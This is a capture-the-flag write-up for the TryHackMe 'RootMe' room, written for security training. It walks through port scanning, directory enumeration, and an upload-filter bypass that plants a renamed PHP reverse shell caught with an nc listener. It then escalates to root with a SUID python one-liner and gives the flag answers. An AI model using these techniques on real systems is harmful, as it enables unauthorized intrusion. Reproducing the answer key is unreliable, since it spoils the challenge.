# RootMe - TryHackMe Writeup

This is a writeup for the "RootMe" room on TryHackMe, which you can find [here](https://tryhackme.com/room/rrootme). 

---

## Steps

### 1. Initial Reconnaissance
- Scanned the target with `nmap`:
  ```bash
  nmap -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -sV -p- 10.10.245.12
  ```
- Flags explained:
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```
- Open ports: `2`
- Apache version: `2.4.29`
- Service on port 22: `ssh`

### 2. Web Enumeration
- Ran `gobuster` to find directories:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [PATH TO WORDLIST]
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.245.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
- Results:
  ```
  /uploads  (Status: 301)
  /css      (Status: 301)
  /js       (Status: 301)
  /panel    (Status: 301)
  ```
- Hidden directory: `/panel/`

### 3. Upload Reverse Shell
- Visited `http://[VICTIM IP]/panel/` and found a file upload form.
- Used [pentestmonkey’s PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell):
  - Edited `php-reverse-shell.php`:
    - Changed `$ip` to my attacker IP (e.g., `10.10.10.10`).
    - Changed `$port` to `4004`.
- Tried uploading as `.php`, but the server rejected it.
- Researched PHP extensions (`.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.pht`) and tested them.
- Renamed to `shell.php5`—upload succeeded.
- Set up a listener:
  ```bash
  nc -lvnp 4004
  ```
- Flags explained:
  - `-l`: Listen mode.
  - `-v`: Verbose output.
  - `-n`: No DNS resolution.
  - `-p 4004`: Port to listen on.
- Navigated to `http://[VICTIM IP]/uploads/shell.php5`, clicked it, and got a shell:
  ```
  Connection received on 10.10.245.12 34712
  Linux rootme 4.15.0-112-generic #113-Ubuntu
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

### 4. Find User Flag
- Searched for `user.txt`:
  ```bash
  $ find -name "user.txt" 2>/dev/null
  ```
- Output: `./var/www/user.txt`
- Navigated and read it:
  ```bash
  $ cd /var/www
  $ cat user.txt
  ```
- Content: `THM{y0u_g0t_a_sh3ll}`

### 5. Privilege Escalation
- Searched for SUID binaries:
  ```bash
  $ find / -user root -perm /4000 2>/dev/null
  ```
- Flags explained:
  - `/`: Search entire filesystem.
  - `-user root`: Owned by root.
  - `-perm /4000`: SUID bit set.
  - `2>/dev/null`: Suppress permission-denied errors.
- Partial output:
  ```
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/bin/sudo
  /usr/bin/python
  /bin/mount
  ....
  ```
- Weird file: `/usr/bin/python` (not a typical SUID binary).
- Used [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) for escalation:
  ```bash
  $ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  ```
- Flags explained (Python command):
  - `-c`: Execute the following Python code.
  - `import os`: Import OS module.
  - `os.execl(...)`: Execute `/bin/sh` with `-p` to preserve privileges.
- Verified root access:
  ```bash
  '# id'
  ```
- Output: `uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)`

### 6. Find Root Flag
- Searched for `root.txt`:
  ```bash
  '# find -name "root.txt" 2>/dev/null'
  ```
- Output: `./root/root.txt`
- Navigated and read it:
  ```bash
  '# cd /root'
  '# cat root.txt'
  ```
- Content: `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Answers to Challenge Questions
1. **How many ports are open?**: `2`
2. **What version of Apache is running?**: `2.4.29`
3. **What service is running on port 22?**: `ssh`
4. **What is the hidden directory?**: `/panel/`
5. **Content of user.txt**: `THM{y0u_g0t_a_sh3ll}`
6. **Weird SUID file**: `/usr/bin/python`
7. **Content of root.txt**: `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Tools Used
- `nmap`: Port and service scanning.
- `gobuster`: Directory enumeration.
- `nc`: Reverse shell listener.
- [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell): Shell payload.
- [GTFOBins](https://gtfobins.github.io/): Privilege escalation guide.

---

## Lessons Learned
- Bypassing upload restrictions with alternate PHP extensions (e.g., `.php5`).
- Setting up reverse shells requires matching IP/port between payload and listener.
- SUID binaries like `/usr/bin/python` can be exploited for root access.

---

